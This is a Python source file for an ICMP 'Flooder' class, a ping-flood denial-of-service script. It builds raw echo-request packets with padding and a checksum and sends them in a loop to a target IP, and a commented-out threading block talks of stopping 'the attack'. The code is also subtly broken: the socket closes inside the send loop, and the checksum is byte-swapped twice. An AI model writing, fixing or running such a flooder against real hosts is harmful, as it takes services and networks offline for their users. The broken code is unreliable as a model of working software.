import time
import struct
import socket
from threading import Thread, Event


class Flooder(object):
    def __init__(self, ip, port, length, freq, threads):
        self.create_socket(ip, port, length, freq)
        # event = Event()
        # list_threads = []
        # try:
        #     for i in range(threads):
        #         thread = Thread(target=self.create_socket(ip, port, length, freq))
        #         thread.daemon = True
        #         thread.start()
        #         list_threads.append(thread)
        # except KeyboardInterrupt:
        #     event.set()
        #     print('\t Stop open threads ...\n')
        #     for thread in list_threads:
        #         thread.join()
        #     print('\t Attack has been stopped!!!\n')

    @staticmethod
    def checksum(msg):
        sum = 0
        for i in range(0, len(msg), 2):
            w = msg[i] + (msg[i + 1] << 8)
            sum = ((sum + w) & 0xffff) + ((sum + w) >> 16)
        return socket.htons(~sum & 0xffff)

    # Construct the header and data of packet and pack it
    def construct_packet(self, length):
        header = struct.pack("bbHHh", 8, 0, 0, 1, 1)
        data = (length - 50) * 'Q'
        data = struct.pack("d", time.time()) + data.encode('ascii')
        header = struct.pack("bbHHh", 8, 0, socket.htons(self.checksum(header + data)), 1, 1)
        return header + data

    # Create socket to send packets to specified ip address
    #  and close the created socket after using
    def create_socket(self, ip, port, length, freq):
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        socket.inet_aton(ip)

        while True:
            packet = self.construct_packet(length)
            sock.sendto(packet, (ip, port))
            time.sleep(freq)
            sock.close()
